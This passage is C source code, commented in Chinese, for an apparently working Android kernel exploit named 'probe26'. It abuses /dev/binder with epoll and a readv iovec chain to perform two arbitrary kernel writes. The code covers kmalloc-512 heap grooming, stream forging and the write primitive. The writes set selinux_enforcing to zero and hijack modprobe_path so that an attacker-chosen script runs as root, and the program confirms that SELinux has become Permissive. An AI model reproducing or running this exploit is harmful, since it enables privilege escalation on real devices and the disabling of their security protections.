 *   iov[8..18] 零长        → 跳过
 *   iov[19..24] {gA,8}×6   → 落用户内存 gA，无害
 * ⇒ 总拷贝 = 3871 + 65537 + 224 + 4 + g_payload_len + 48 = STREAM_HI + g_pay_len
 *   默认路径 21 字符 ⇒ g_payload_len = 24 ⇒ g_pay_len = 76 ⇒ 与 probe25 的 69708 同基线
 * ========================================================================= */

static size_t build_stream_double(uint8_t *st) {
    memset(st, FA, SEG0_LEN);
    memset(st + SEG0_LEN, FB, SEG4_LEN);
    uint8_t *fb = st + SEG5_OFF;
    memset(fb, 0, FORGE_LEN);
    uint64_t v;
    v = FORGE_LEN;                memcpy(fb + 8,  &v, 8);
    v = A_SELINUX_ENFORCING;      memcpy(fb + 16, &v, 8);
    v = 4;                        memcpy(fb + 24, &v, 8);
    v = A_MODPROBE_PATH;          memcpy(fb + 32, &v, 8);
    v = (uint64_t)g_payload_len;  memcpy(fb + 40, &v, 8);   /* ← 运行期值，不再硬编码 24 */
    /* fb[48..223] 已由 memset 置 0 */
    uint8_t *pl = st + STREAM_HI;
    memset(pl, 0, g_pay_len);
    pl[0] = 0; pl[1] = 0; pl[2] = 0; pl[3] = 0;              /* ← selinux_enforcing := 0 */
    memcpy(pl + 4, g_payload, strlen(g_payload));            /* ← 路径本体，尾部 NUL 由 memset 保证 */
    return g_expect_ret;
}

/* ---------------- SELinux 状态读取 / 后置轮询 ---------------- */
/* 0 = Permissive；1 = Enforcing；-1 = 读不到 */
static int selinux_enforce_read(void) {
    FILE *f = fopen("/sys/fs/selinux/enforce", "r");
    if (!f) return -1;
    char b[16] = {0};
    if (!fgets(b, sizeof(b), f)) { fclose(f); return -1; }
    fclose(f);
    return atoi(b);
}
/* 轮询 enforce ≤timeout_ms：0 = 已 Permissive；1 = 仍 Enforcing；-1 = 一直读不到 */
static int selinux_wait_permissive(int timeout_ms) {
    int last = -1;
    for (int t = 0; t < timeout_ms; t += 50) {
        int e = selinux_enforce_read();
        if (e >= 0) last = e;
        if (last == 0) return 0;
        usleep(50000);
    }
    return (last < 0) ? -1 : last;
}
static const char *enforce_str(int e) {
    return (e == 0) ? "Permissive" : (e == 1) ? "Enforcing" : "unknown";
}

/* 结果行：-q 下也照常输出 stdout（同时进日志；与 stdout 同文件时只写一次） */
static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt); vprintf(fmt, ap); va_end(ap);
    fflush(stdout);
    if (LOGF && !g_log_is_stdout) {
        va_start(ap, fmt); vfprintf(LOGF, fmt, ap); va_end(ap);
        fflush(LOGF); fsync(fileno(LOGF));
    }
}

static void usage(const char *argv0) {
    printf("用法: %s [-p PATH] [-n N] [-L PATH] [-y] [-q] [-V] [-h]\n", argv0);
    printf("  -p PATH   将 modprobe_path 劫持到该脚本（默认 %s）\n", D_PAYLOAD);
    printf("            要求：绝对路径；长度 ≤ %d 字节\n", PAYLOAD_MAX);
    printf("  -n N      清场常驻 kmalloc-512 个数（默认 %d，勿随意调小）\n", DEF_NCLEAR);
    printf("  -L PATH   日志路径（默认 %s）\n", D_LOG_PATH);
    printf("  -y        跳过交互确认（非交互/脚本调用时必带）\n");
    printf("  -q        安静模式：只输出结果行\n");
    printf("  -V        打印版本与构建信息后退出\n");
    printf("  -h        帮助\n");
    printf("退出码: 0 = 链命中且 selinux 已 Permissive\n");
    printf("        2 = readv 返回值不匹配，或写后 enforce 仍为 1（先对账，勿触发）\n");
    printf("        1 = 前置检查失败 / 资源错误\n");
}

int main(int argc, char **argv) {
    int rc = 1;                       /* 默认：前置检查/资源错误 */
    int fd = -1, epfd = -1;
    pid_t obspid = -1;
    g_nclear = DEF_NCLEAR;

    /* ---- CLI ---- */
    int opt;
    while ((opt = getopt(argc, argv, "p:n:L:yqVh")) != -1) {
        switch (opt) {
        case 'p': g_payload = optarg; break;
        case 'n': g_nclear = atoi(optarg); break;
        case 'L':
            snprintf(g_log_path, sizeof(g_log_path), "%s", optarg);
            snprintf(g_obs_path, sizeof(g_obs_path), "%s.obs", optarg);
            break;
        case 'y': g_force = 1; break;
        case 'q': g_quiet = 1; break;
        case 'V':
            printf("%s  built %s %s\n", PROBE26_VER, __DATE__, __TIME__);
            printf("chain: SEG0=%d SEG4=%d FORGE=%d STREAM_HI=%zu IOVCNT=%d L5=0x%x\n",
                   SEG0_LEN, SEG4_LEN, FORGE_LEN, (size_t)STREAM_HI, IOVCNT, L5);
            printf("targets: selinux_enforcing=0x%016lx modprobe_path=0x%016lx\n",
                   (unsigned long)A_SELINUX_ENFORCING, (unsigned long)A_MODPROBE_PATH);
            return 0;
        case 'h': usage(argv[0]); return 0;
        default:  usage(argv[0]); return 1;
        }
    }

    /* ---- 前置检查（不通过一律退出 1，此时尚未占用任何资源） ---- */
    size_t plen = strlen(g_payload);
    if (plen == 0 || g_payload[0] != '/') {
        fprintf(stderr, "[-] -p 必须是绝对路径（且非空）：\"%s\"\n", g_payload);
        return 1;
    }
    if (plen > PAYLOAD_MAX) {
        fprintf(stderr, "[-] -p 长度 %zu > %d：\"%s\"\n", plen, PAYLOAD_MAX, g_payload);
        return 1;
    }
    if (g_nclear < 1) { fprintf(stderr, "[-] -n 必须 ≥ 1（收到 %d）\n", g_nclear); return 1; }
    if (g_nclear > MAXC) g_nclear = MAXC;

    /* 长度预算：写入长度 = align8(strlen+1)，见文件头注释 */
    g_payload_len = ALIGN8(plen + 1);
    g_pay_len     = 4 + g_payload_len + 48;
    g_expect_ret  = (size_t)STREAM_HI + g_pay_len;

    int path_x = (access(g_payload, X_OK) == 0);
    if (!path_x) {
        fprintf(stderr, "[!] payload 不存在或不可执行：%s\n", g_payload);
        if (!g_force) { fprintf(stderr, "[!] 未加 -y，退出（加 -y 可强制执行）\n"); return 1; }
        fprintf(stderr, "[!] 已带 -y，继续（内核按需执行时若文件缺失将失败）\n");
    }

    setvbuf(stdout, NULL, _IOLBF, 0);
    signal(SIGALRM, bye); alarm(600);
    LOGF = fopen(g_log_path, "a");     /* 用 O_APPEND 打开：见下方说明，绝不能用 "w" */
    if (!LOGF) { fprintf(stderr, "[-] 无法打开日志 %s: %s\n", g_log_path, strerror(errno)); return 1; }
    log_samefile_probe();
    /* 为什么必须 "a" 而不是 "w"：
     * 调用方常写 `./probe26 ... > probe26.log 2>&1`，此时 sh 已经 truncate 过一次，
     * 而 stderr 的前置检查输出（payload 警告等）已把 **共享的 fd1/fd2 偏移** 推到 N。
     * 若此处再用 "w" 截断一次，偏移不会被重置 ⇒ 之后的写入落在 N 处，文件头 N 字节
     * 变成空洞（probe26 v1.1 实测：日志头部出现 185 个 NUL）。
     * 改为追加打开 + 「只在日志与 stdout 不同文件时才主动清空」，两个问题一起消失。 */
    if (!g_log_is_stdout) truncate(g_log_path, 0);

    plog("[+] %s  built %s %s\n", PROBE26_VER, __DATE__, __TIME__);
    plog("[+] payload   = %s（%zu 字节；写入 %zu 字节 = align8(%zu+1)）\n",
         g_payload, plen, g_payload_len, plen);
    plog("[+] 日志 %s（observer 日志 %s）\n", g_log_path, g_obs_path);
    plog("[+] 静态地址：selinux_enforcing=0x%016lx  modprobe_path=0x%016lx\n",
         (unsigned long)A_SELINUX_ENFORCING, (unsigned long)A_MODPROBE_PATH);
    plog("[+] 链预算：SEG0=%d SEG4=%d FORGE=%d ⇒ STREAM_HI=%zu；PAY_LEN=%zu（4+%zu+48）\n",
         SEG0_LEN, SEG4_LEN, FORGE_LEN, (size_t)STREAM_HI, g_pay_len, g_payload_len);
    plog("[+] iov 总预算：readv count=%zu（n=%d）；期望 readv 返回 %zu\n",
         iov_total_readv(IOVCNT), IOVCNT, g_expect_ret);

    /* ---- 运行前状态（供对账） ---- */
    int e0 = selinux_enforce_read();
    plog("[!] 运行前 selinux enforce = %s（enforce=%d）\n", enforce_str(e0), e0);
    plog("[!] 清场个数 n=%d\n", g_nclear);

    /* ================= 资源全部在此预开（kmalloc-512 黑名单纪律） ================= */
    rc = 2;                                    /* 进入执行段后，默认判据为「链未命中」 */

    cpu_set_t set; CPU_ZERO(&set); CPU_SET(4, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0) perror("affinity");

    gA = mmap((void *)0x20000000, 1024 * 1024, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);
    gB = mmap((void *)0x20200000, 1024 * 1024, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);
    if (gA == MAP_FAILED || gB == MAP_FAILED) { perror("[-] mmap A/B"); rc = 1; goto out; }
    memset(gA, FA, 1024 * 1024);
    memset(gB, FB, 1024 * 1024);
    DBUF = mmap(NULL, DMAX, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    flag_p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    OBS    = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (DBUF == MAP_FAILED || flag_p == MAP_FAILED || OBS == MAP_FAILED) { perror("[-] mmap misc"); rc = 1; goto out; }
    *flag_p = 0; memset(OBS, 0, sizeof(*OBS));

    fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) { perror("[-] open /dev/binder"); rc = 1; goto out; }
    if (fcntl(fd, F_SETFL, O_NONBLOCK) < 0) perror("[!] fcntl NONBLOCK");
    epfd = epoll_create(1);
    if (epfd < 0) { perror("[-] epoll_create"); rc = 1; goto out; }

    if (pipe(steal_pipe[1]) < 0) { perror("[-] steal pipe"); rc = 1; goto out; }
    for (int i = 0; i < MAXC; i++)
        if (pipe(clearc_pipe[i]) < 0) { perror("[-] clearc pipe"); rc = 1; goto out; }
    if (pipe(syncd) < 0) { perror("[-] syncd"); rc = 1; goto out; }
    /* 沿用 probe24 R3 的配置：steal pipe 不设 F_SETPIPE_SZ ⇒ 默认 64KB，
     * 流长 > 65536 ⇒ 写端必然进入 pipe_wait ⇒ waiting_writers≥1，
     * 读端不会因 syscall-merging 早退（这是 R3 两次实测跑通的那套）。 */
    int spcap = fcntl(steal_pipe[1][0], F_GETPIPE_SZ);
    plog("[+] fd=%d epfd=%d steal_pipe={%d,%d} cap=%d 资源全部预开\n",
         fd, epfd, steal_pipe[1][0], steal_pipe[1][1], spcap);

    /* ---- observer（绑 CPU5） ---- */
    obspid = fork();
    if (obspid == 0) observer_run();

    /* ---- 清场（n 个常驻 kmalloc-512 作 freelist ballast） ---- */
    if (do_clear(g_nclear) <= 0) { plog("[-] 清场失败\n"); rc = 1; goto out; }
    slab_snap("T0  清场之后 / crit 之前");

    {
        long bm_sz = 128 * 1024;
        void *bm = mmap(NULL, (size_t)bm_sz, PROT_READ, MAP_PRIVATE, fd, 0);
        if (bm == MAP_FAILED) { perror("[-] binder_mmap"); rc = 1; goto out; }
        plog("[+] binder_mmap=%p\n", bm);
    }
    if (LOGF) { fflush(LOGF); fsync(fileno(LOGF)); }

    static uint8_t rb[256];
    struct iovec iov[MAXIOV];

    /* =====================================================================
     * 单轮 crit：VERSION → txn → ADD → EXIT → readv(阻塞) ；DEL(+1.5s) 后
     * 单次连续 write 全流 ⇒ 链推进 ⇒ 两次 __copy_to_user 落静态地址
     * ==================================================================== */
    plog("\n================ probe26  readv 链 → 单链双写 ================\n");
    OBS->rnd = 1;
    ssize_t sret = 0; int serr = 0;
    {
        pid_t delpid = fork();
        if (delpid == 0) {                       /* DEL 子进程 */
            alarm(600);
            usleep(1500000);
            int rr = epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &(struct epoll_event){ .events = EPOLLIN });
            plog("[del] DEL=%d errno=%d\n", rr, errno);
            size_t tot = g_expect_ret;
            uint8_t *st = malloc(tot);
            if (!st) { plog("[del] malloc 失败\n"); _exit(1); }
            size_t sn = build_stream_double(st);
            errno = 0;
            ssize_t w1 = write(steal_pipe[1][1], st, sn);     /* 必须单次连续 write */
            plog("[del] 单次 write=%zd（期望 %zu）errno=%d\n", w1, sn, errno);
            free(st);
            usleep(150000);
            char c = 3; ssize_t w = write(syncd[1], &c, 1); (void)w;
            _exit(0);
        }
        build_iov_readv(iov, IOVCNT);
        struct crit_out o;
        crit_run(fd, epfd, iov, IOVCNT, &o, rb, sizeof(rb), 3, steal_pipe[1], &sret, &serr);
        plog("[crit] VERSION=%ldns txn=%ldns ADD=%ldns EXIT=%ldns 合计=%ldns bad=%d "
             "readv=%zd serr=%d（期望 %zu = %d + %d + %d + 4 + %zu + 48）\n",
             o.v1 - o.c0, o.c1 - o.v1, o.c2 - o.c1, o.c3 - o.c2, o.c3 - o.c0, o.bad, sret, serr,
             g_expect_ret, SEG0_LEN, SEG4_LEN, FORGE_LEN, g_payload_len);
        char c; ssize_t rr2 = read(syncd[0], &c, 1); (void)rr2;
        waitpid(delpid, 0, 0);

        if (sret == (ssize_t)g_expect_ret) {
            plog("[+] readv 返回与期望逐字节吻合 ⇒ 链按设计推进，两次任意写均已发出\n");
        } else {
            plog("[-] readv 返回 %zd ≠ 期望 %zu ⇒ 先对账，勿据此判断写是否生效\n",
                 sret, g_expect_ret);
        }
        plog("[+] 本次写入（若链成立）：\n");
        plog("[+]    0x%016lx ← 0x00000000   （4B  selinux_enforcing）\n", (unsigned long)A_SELINUX_ENFORCING);
        plog("[+]    0x%016lx ← \"%s\"  （%zu B modprobe_path）\n",
             (unsigned long)A_MODPROBE_PATH, g_payload, g_payload_len);
    }

    /* ---- 后置确认：轮询 enforce ≤2s（比裸 readv 值更友好的成功信号） ---- */
    int e1 = selinux_wait_permissive(2000);
    if (e1 == 0)      plog("[+] selinux: Permissive\n");
    else if (e1 == 1) plog("[-] selinux: 仍为 Enforcing\n");
    else              plog("[!] selinux: /sys/fs/selinux/enforce 读不到\n");

    if (sret == (ssize_t)g_expect_ret && e1 == 0) rc = 0;
    else rc = 2;

    rlog("%s payload=%s selinux=%s readv=%zd/%zu result=%s\n",
         rc == 0 ? "[+]" : "[-]", g_payload, enforce_str(e1), sret, g_expect_ret,
         rc == 0 ? "OK" : "FAIL");
    plog("[!] 本程序不触发 modprobe：由外部在 getenforce 确认 Permissive 之后再触发。\n");

out:
    reap_clear();
    if (obspid > 0) {
        OBS->done = 1;
        int st; waitpid(obspid, &st, 0); (void)st;
    }
    reap_nb(300);
    /* 关闭全部自有 fd */
    if (fd >= 0) close(fd);
    if (epfd >= 0) close(epfd);
    for (int i = 0; i < 5; i++) { if (steal_pipe[i][0] > 0) close(steal_pipe[i][0]); if (steal_pipe[i][1] > 0) close(steal_pipe[i][1]); }
    for (int i = 0; i < MAXC; i++) { if (clearc_pipe[i][0] > 0) close(clearc_pipe[i][0]); if (clearc_pipe[i][1] > 0) close(clearc_pipe[i][1]); }
    if (syncd[0] > 0) close(syncd[0]);
    if (syncd[1] > 0) close(syncd[1]);
    if (LOGF) { fclose(LOGF); LOGF = NULL; }
    return rc;
}
